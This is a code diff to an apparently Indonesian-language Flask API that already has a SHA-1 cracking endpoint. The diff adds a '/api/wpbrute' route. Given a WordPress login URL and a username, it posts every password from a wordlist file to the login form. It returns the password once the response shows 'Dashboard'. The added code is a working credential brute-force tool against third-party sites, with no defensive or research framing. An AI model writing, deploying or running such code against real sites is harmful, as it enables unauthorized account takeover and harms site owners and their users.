@@ -403,5 +403,40 @@ def sha1crack():
             "message": "masukkan parameter sha1"
         }
 
+@app.route('/api/wpbrute', methods=['GET', 'POST'])
+def wpbrute():
+    if request.args.get('wp'):
+        if request.args.get('u'):
+            kondisi = 'Dashboard'
+            target = request.args.get('wp')
+            username = request.args.get('u')
+            pw = open('mdpass.txt', 'r')
+            for pwd in pw.read().splitlines():
+                form = {"log":username, "pwd":pwd, "submit":"wp-submit"}
+                req = post(target, data=form)
+                w = req.text
+                if kondisi in w:
+                    return {
+                        "status": 200,
+                        "message": "Brute berhasil",
+                        "password": pwd
+                    }
+            else:
+                return {
+                    "status": False,
+                    "message": "password tidak ditemukan",
+                    "password": ""
+                }
+        else:
+            return {
+                "status": False,
+                "message": "tambahkan parameter u untuk username"
+            }
+    else:
+        return {
+            "status": False,
+            "message": "masukkan parameter wp"
+        }
+
 if __name__ == "__main__":
     app.run()
